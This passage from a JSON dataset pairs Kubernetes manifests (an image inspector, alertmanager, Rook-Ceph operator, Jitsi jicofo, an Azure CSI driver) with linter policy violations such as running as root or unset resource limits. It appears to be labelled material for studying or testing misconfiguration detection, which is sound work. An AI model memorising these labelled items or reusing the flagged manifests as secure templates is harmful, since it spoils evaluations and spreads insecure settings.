blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"blackduck-imageinspector-ubuntu\" has cpu request 0"
  },
  {
    "id": "9203",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"blackduck-imageinspector-alpine\" has memory limit 0"
  },
  {
    "id": "9204",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"blackduck-imageinspector-centos\" has memory limit 0"
  },
  {
    "id": "9205",
    "manifest_path": "data/manifests/the_stack_sample/sample_3481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: blackduck-imageinspector\n  labels:\n    app: blackduck-imageinspector\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: blackduck-imageinspector\n  template:\n    metadata:\n      labels:\n        app: blackduck-imageinspector\n    spec:\n      containers:\n      - name: blackduck-imageinspector-alpine\n        image: blackducksoftware/blackduck-imageinspector-alpine:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8080\n          hostPort: 8080\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8080\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-centos\n        image: blackducksoftware/blackduck-imageinspector-centos:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8081\n          hostPort: 8081\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      - name: blackduck-imageinspector-ubuntu\n        image: blackducksoftware/blackduck-imageinspector-ubuntu:3.0.0-SNAPSHOT\n        volumeMounts:\n        - name: inspector-shared-dir\n          mountPath: /opt/blackduck/shared\n        ports:\n        - containerPort: 8082\n          hostPort: 8082\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8082\n          initialDelaySeconds: 120\n          periodSeconds: 120\n          timeoutSeconds: 60\n      volumes:\n      - name: inspector-shared-dir\n        hostPath:\n          path: /Users/billings/tmp/shared\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"blackduck-imageinspector-ubuntu\" has memory limit 0"
  },
  {
    "id": "9206",
    "manifest_path": "data/manifests/the_stack_sample/sample_3483.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alertmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: alertmanager\n  template:\n    metadata:\n      labels:\n        name: alertmanager\n    spec:\n      containers:\n      - name: alertmanager\n        image: quay.io/cortexproject/cortex:v1.9.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=alertmanager\n        - -log.level=debug\n        - -server.http-listen-port=80\n        - -alertmanager.configs.url=http://configs.default.svc.cluster.local:80\n        - -alertmanager.web.external-url=/alertmanager\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"alertmanager\" does not have a read-only root file system"
  },
  {
    "id": "9207",
    "manifest_path": "data/manifests/the_stack_sample/sample_3483.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alertmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: alertmanager\n  template:\n    metadata:\n      labels:\n        name: alertmanager\n    spec:\n      containers:\n      - name: alertmanager\n        image: quay.io/cortexproject/cortex:v1.9.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=alertmanager\n        - -log.level=debug\n        - -server.http-listen-port=80\n        - -alertmanager.configs.url=http://configs.default.svc.cluster.local:80\n        - -alertmanager.web.external-url=/alertmanager\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"alertmanager\" is not set to runAsNonRoot"
  },
  {
    "id": "9208",
    "manifest_path": "data/manifests/the_stack_sample/sample_3483.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alertmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: alertmanager\n  template:\n    metadata:\n      labels:\n        name: alertmanager\n    spec:\n      containers:\n      - name: alertmanager\n        image: quay.io/cortexproject/cortex:v1.9.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=alertmanager\n        - -log.level=debug\n        - -server.http-listen-port=80\n        - -alertmanager.configs.url=http://configs.default.svc.cluster.local:80\n        - -alertmanager.web.external-url=/alertmanager\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"alertmanager\" has cpu request 0"
  },
  {
    "id": "9209",
    "manifest_path": "data/manifests/the_stack_sample/sample_3483.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: alertmanager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: alertmanager\n  template:\n    metadata:\n      labels:\n        name: alertmanager\n    spec:\n      containers:\n      - name: alertmanager\n        image: quay.io/cortexproject/cortex:v1.9.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - -target=alertmanager\n        - -log.level=debug\n        - -server.http-listen-port=80\n        - -alertmanager.configs.url=http://configs.default.svc.cluster.local:80\n        - -alertmanager.web.external-url=/alertmanager\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"alertmanager\" has memory limit 0"
  },
  {
    "id": "9210",
    "manifest_path": "data/manifests/the_stack_sample/sample_3487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-operator\n  namespace: rook-ceph\n  labels:\n    operator: rook\n    storage-backend: ceph\nspec:\n  selector:\n    matchLabels:\n      app: rook-ceph-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-operator\n    spec:\n      serviceAccountName: rook-ceph-system\n      containers:\n      - name: rook-ceph-operator\n        image: rook/ceph:master\n        args:\n        - ceph\n        - operator\n        volumeMounts:\n        - mountPath: /var/lib/rook\n          name: rook-config\n        - mountPath: /etc/ceph\n          name: default-config-dir\n        env:\n        - name: ROOK_CURRENT_NAMESPACE_ONLY\n          value: 'true'\n        - name: ROOK_ALLOW_MULTIPLE_FILESYSTEMS\n          value: 'false'\n        - name: ROOK_LOG_LEVEL\n          value: INFO\n        - name: ROOK_CEPH_STATUS_CHECK_INTERVAL\n          value: 60s\n        - name: ROOK_MON_HEALTHCHECK_INTERVAL\n          value: 45s\n        - name: ROOK_MON_OUT_TIMEOUT\n          value: 600s\n        - name: ROOK_DISCOVER_DEVICES_INTERVAL\n          value: 60m\n        - name: ROOK_HOSTPATH_REQUIRES_PRIVILEGED\n          value: 'false'\n        - name: ROOK_ENABLE_SELINUX_RELABELING\n          value: 'true'\n        - name: ROOK_ENABLE_FSGROUP\n          value: 'true'\n        - name: ROOK_DISABLE_DEVICE_HOTPLUG\n          value: 'false'\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: rook-config\n        emptyDir: {}\n      - name: default-config-dir\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rook-ceph-operator\" does not have a read-only root file system"
  },
  {
    "id": "9211",
    "manifest_path": "data/manifests/the_stack_sample/sample_3487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-operator\n  namespace: rook-ceph\n  labels:\n    operator: rook\n    storage-backend: ceph\nspec:\n  selector:\n    matchLabels:\n      app: rook-ceph-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-operator\n    spec:\n      serviceAccountName: rook-ceph-system\n      containers:\n      - name: rook-ceph-operator\n        image: rook/ceph:master\n        args:\n        - ceph\n        - operator\n        volumeMounts:\n        - mountPath: /var/lib/rook\n          name: rook-config\n        - mountPath: /etc/ceph\n          name: default-config-dir\n        env:\n        - name: ROOK_CURRENT_NAMESPACE_ONLY\n          value: 'true'\n        - name: ROOK_ALLOW_MULTIPLE_FILESYSTEMS\n          value: 'false'\n        - name: ROOK_LOG_LEVEL\n          value: INFO\n        - name: ROOK_CEPH_STATUS_CHECK_INTERVAL\n          value: 60s\n        - name: ROOK_MON_HEALTHCHECK_INTERVAL\n          value: 45s\n        - name: ROOK_MON_OUT_TIMEOUT\n          value: 600s\n        - name: ROOK_DISCOVER_DEVICES_INTERVAL\n          value: 60m\n        - name: ROOK_HOSTPATH_REQUIRES_PRIVILEGED\n          value: 'false'\n        - name: ROOK_ENABLE_SELINUX_RELABELING\n          value: 'true'\n        - name: ROOK_ENABLE_FSGROUP\n          value: 'true'\n        - name: ROOK_DISABLE_DEVICE_HOTPLUG\n          value: 'false'\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: rook-config\n        emptyDir: {}\n      - name: default-config-dir\n        emptyDir: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"rook-ceph-system\" not found"
  },
  {
    "id": "9212",
    "manifest_path": "data/manifests/the_stack_sample/sample_3487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-operator\n  namespace: rook-ceph\n  labels:\n    operator: rook\n    storage-backend: ceph\nspec:\n  selector:\n    matchLabels:\n      app: rook-ceph-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-operator\n    spec:\n      serviceAccountName: rook-ceph-system\n      containers:\n      - name: rook-ceph-operator\n        image: rook/ceph:master\n        args:\n        - ceph\n        - operator\n        volumeMounts:\n        - mountPath: /var/lib/rook\n          name: rook-config\n        - mountPath: /etc/ceph\n          name: default-config-dir\n        env:\n        - name: ROOK_CURRENT_NAMESPACE_ONLY\n          value: 'true'\n        - name: ROOK_ALLOW_MULTIPLE_FILESYSTEMS\n          value: 'false'\n        - name: ROOK_LOG_LEVEL\n          value: INFO\n        - name: ROOK_CEPH_STATUS_CHECK_INTERVAL\n          value: 60s\n        - name: ROOK_MON_HEALTHCHECK_INTERVAL\n          value: 45s\n        - name: ROOK_MON_OUT_TIMEOUT\n          value: 600s\n        - name: ROOK_DISCOVER_DEVICES_INTERVAL\n          value: 60m\n        - name: ROOK_HOSTPATH_REQUIRES_PRIVILEGED\n          value: 'false'\n        - name: ROOK_ENABLE_SELINUX_RELABELING\n          value: 'true'\n        - name: ROOK_ENABLE_FSGROUP\n          value: 'true'\n        - name: ROOK_DISABLE_DEVICE_HOTPLUG\n          value: 'false'\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: rook-config\n        emptyDir: {}\n      - name: default-config-dir\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rook-ceph-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9213",
    "manifest_path": "data/manifests/the_stack_sample/sample_3487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-operator\n  namespace: rook-ceph\n  labels:\n    operator: rook\n    storage-backend: ceph\nspec:\n  selector:\n    matchLabels:\n      app: rook-ceph-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-operator\n    spec:\n      serviceAccountName: rook-ceph-system\n      containers:\n      - name: rook-ceph-operator\n        image: rook/ceph:master\n        args:\n        - ceph\n        - operator\n        volumeMounts:\n        - mountPath: /var/lib/rook\n          name: rook-config\n        - mountPath: /etc/ceph\n          name: default-config-dir\n        env:\n        - name: ROOK_CURRENT_NAMESPACE_ONLY\n          value: 'true'\n        - name: ROOK_ALLOW_MULTIPLE_FILESYSTEMS\n          value: 'false'\n        - name: ROOK_LOG_LEVEL\n          value: INFO\n        - name: ROOK_CEPH_STATUS_CHECK_INTERVAL\n          value: 60s\n        - name: ROOK_MON_HEALTHCHECK_INTERVAL\n          value: 45s\n        - name: ROOK_MON_OUT_TIMEOUT\n          value: 600s\n        - name: ROOK_DISCOVER_DEVICES_INTERVAL\n          value: 60m\n        - name: ROOK_HOSTPATH_REQUIRES_PRIVILEGED\n          value: 'false'\n        - name: ROOK_ENABLE_SELINUX_RELABELING\n          value: 'true'\n        - name: ROOK_ENABLE_FSGROUP\n          value: 'true'\n        - name: ROOK_DISABLE_DEVICE_HOTPLUG\n          value: 'false'\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: rook-config\n        emptyDir: {}\n      - name: default-config-dir\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rook-ceph-operator\" has cpu request 0"
  },
  {
    "id": "9214",
    "manifest_path": "data/manifests/the_stack_sample/sample_3487.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rook-ceph-operator\n  namespace: rook-ceph\n  labels:\n    operator: rook\n    storage-backend: ceph\nspec:\n  selector:\n    matchLabels:\n      app: rook-ceph-operator\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: rook-ceph-operator\n    spec:\n      serviceAccountName: rook-ceph-system\n      containers:\n      - name: rook-ceph-operator\n        image: rook/ceph:master\n        args:\n        - ceph\n        - operator\n        volumeMounts:\n        - mountPath: /var/lib/rook\n          name: rook-config\n        - mountPath: /etc/ceph\n          name: default-config-dir\n        env:\n        - name: ROOK_CURRENT_NAMESPACE_ONLY\n          value: 'true'\n        - name: ROOK_ALLOW_MULTIPLE_FILESYSTEMS\n          value: 'false'\n        - name: ROOK_LOG_LEVEL\n          value: INFO\n        - name: ROOK_CEPH_STATUS_CHECK_INTERVAL\n          value: 60s\n        - name: ROOK_MON_HEALTHCHECK_INTERVAL\n          value: 45s\n        - name: ROOK_MON_OUT_TIMEOUT\n          value: 600s\n        - name: ROOK_DISCOVER_DEVICES_INTERVAL\n          value: 60m\n        - name: ROOK_HOSTPATH_REQUIRES_PRIVILEGED\n          value: 'false'\n        - name: ROOK_ENABLE_SELINUX_RELABELING\n          value: 'true'\n        - name: ROOK_ENABLE_FSGROUP\n          value: 'true'\n        - name: ROOK_DISABLE_DEVICE_HOTPLUG\n          value: 'false'\n        - name: NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n      volumes:\n      - name: rook-config\n        emptyDir: {}\n      - name: default-config-dir\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rook-ceph-operator\" has memory limit 0"
  },
  {
    "id": "9215",
    "manifest_path": "data/manifests/the_stack_sample/sample_3489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: jitsi\n  labels:\n    k8s-app: jicofo\n  name: jicofo\nspec:\n  selector:\n    matchLabels:\n      app: jicofo\n  template:\n    metadata:\n      labels:\n        app: jicofo\n    spec:\n      containers:\n      - name: jicofo\n        env:\n        - name: XMPP_SERVER\n          value: shard-0-prosody\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"jicofo\" is using an invalid container image, \"\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9216",
    "manifest_path": "data/manifests/the_stack_sample/sample_3489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: jitsi\n  labels:\n    k8s-app: jicofo\n  name: jicofo\nspec:\n  selector:\n    matchLabels:\n      app: jicofo\n  template:\n    metadata:\n      labels:\n        app: jicofo\n    spec:\n      containers:\n      - name: jicofo\n        env:\n        - name: XMPP_SERVER\n          value: shard-0-prosody\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"jicofo\" does not have a read-only root file system"
  },
  {
    "id": "9217",
    "manifest_path": "data/manifests/the_stack_sample/sample_3489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: jitsi\n  labels:\n    k8s-app: jicofo\n  name: jicofo\nspec:\n  selector:\n    matchLabels:\n      app: jicofo\n  template:\n    metadata:\n      labels:\n        app: jicofo\n    spec:\n      containers:\n      - name: jicofo\n        env:\n        - name: XMPP_SERVER\n          value: shard-0-prosody\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"jicofo\" is not set to runAsNonRoot"
  },
  {
    "id": "9218",
    "manifest_path": "data/manifests/the_stack_sample/sample_3489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: jitsi\n  labels:\n    k8s-app: jicofo\n  name: jicofo\nspec:\n  selector:\n    matchLabels:\n      app: jicofo\n  template:\n    metadata:\n      labels:\n        app: jicofo\n    spec:\n      containers:\n      - name: jicofo\n        env:\n        - name: XMPP_SERVER\n          value: shard-0-prosody\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"jicofo\" has cpu request 0"
  },
  {
    "id": "9219",
    "manifest_path": "data/manifests/the_stack_sample/sample_3489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: jitsi\n  labels:\n    k8s-app: jicofo\n  name: jicofo\nspec:\n  selector:\n    matchLabels:\n      app: jicofo\n  template:\n    metadata:\n      labels:\n        app: jicofo\n    spec:\n      containers:\n      - name: jicofo\n        env:\n        - name: XMPP_SERVER\n          value: shard-0-prosody\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"jicofo\" has memory limit 0"
  },
  {
    "id": "9220",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      - hostPath:\n          path: /etc/kubernetes/\n          type: Directory\n        name: cloud-sa-volume\n      - hostPath:\n          path: /var/lib/waagent/ManagedIdentity-Settings\n        name: msi\n      - hostPath:\n          path: /dev\n          type: Directory\n        name: device-dir\n      - hostPath:\n          path: /sys/bus/scsi/devices\n          type: Directory\n        name: sys-devices-dir\n      - hostPath:\n          path: /sys/class/scsi_host/\n          type: Directory\n        name: scsi-host-dir\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (azure-disk-csi-driver-node-sa), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "9221",
    "manifest_path": "data/manifests/the_stack_sample/sample_3490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: azure-disk-csi-driver-node\n  namespace: openshift-cluster-csi-drivers\n  annotations:\n    config.openshift.io/inject-proxy: csi-driver\nspec:\n  selector:\n    matchLabels:\n      app: azure-disk-csi-driver-node\n  template:\n    metadata:\n      labels:\n        app: azure-disk-csi-driver-node\n    spec:\n      serviceAccount: azure-disk-csi-driver-node-sa\n      containers:\n      - name: csi-driver\n        securityContext:\n          privileged: true\n        image: ${DRIVER_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --endpoint=$(CSI_ENDPOINT)\n        - --logtostderr\n        - --v=${LOG_LEVEL}\n        - --nodeid=$(KUBE_NODE_NAME)\n        env:\n        - name: AZURE_CREDENTIAL_FILE\n          value: /etc/kubernetes/cloud.conf\n        - name: CSI_ENDPOINT\n          value: unix:///csi/csi.sock\n        - name: KUBE_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        volumeMounts:\n        - mountPath: /csi\n          name: socket-dir\n        - mountPath: /var/lib/kubelet/\n          mountPropagation: Bidirectional\n          name: mountpoint-dir\n        - mountPath: /etc/kubernetes/\n          readOnly: true\n          name: cloud-sa-volume\n        - mountPath: /var/lib/waagent/ManagedIdentity-Settings\n          readOnly: true\n          name: msi\n        - mountPath: /dev\n          name: device-dir\n        - mountPath: /sys/bus/scsi/devices\n          name: sys-devices-dir\n        - mountPath: /sys/class/scsi_host/\n          name: scsi-host-dir\n        ports:\n        - name: healthz\n          containerPort: 10300\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: healthz\n          initialDelaySeconds: 10\n          timeoutSeconds: 3\n          periodSeconds: 10\n          failureThreshold: 5\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-node-driver-registrar\n        securityContext:\n          privileged: true\n        image: ${NODE_DRIVER_REGISTRAR_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=$(ADDRESS)\n        - --kubelet-registration-path=$(DRIVER_REG_SOCK_PATH)\n        - --v=${LOG_LEVEL}\n        env:\n        - name: ADDRESS\n          value: /csi/csi.sock\n        - name: DRIVER_REG_SOCK_PATH\n          value: /var/lib/kubelet/plugins/disk.csi.azure.com/csi.sock\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        - name: registration-dir\n          mountPath: /registration\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      - name: csi-liveness-probe\n        image: ${LIVENESS_PROBE_IMAGE}\n        imagePullPolicy: IfNotPresent\n        args:\n        - --csi-address=/csi/csi.sock\n        - --probe-timeout=3s\n        - --health-port=10300\n        volumeMounts:\n        - name: socket-dir\n          mountPath: /csi\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n      volumes:\n      - hostPath:\n          path: /var/lib/kubelet/plugins/disk.csi.azure.com\n          type: DirectoryOrCreate\n        name: socket-dir\n      - hostPath:\n          path: /var/lib/kubelet/\n          type: DirectoryOrCreate\n        name: mountpoint-dir\n      - hostPath:\n          path: /var/lib/kubelet/plugins_registry/\n          type: DirectoryOrCreate\n        name: registration-dir\n      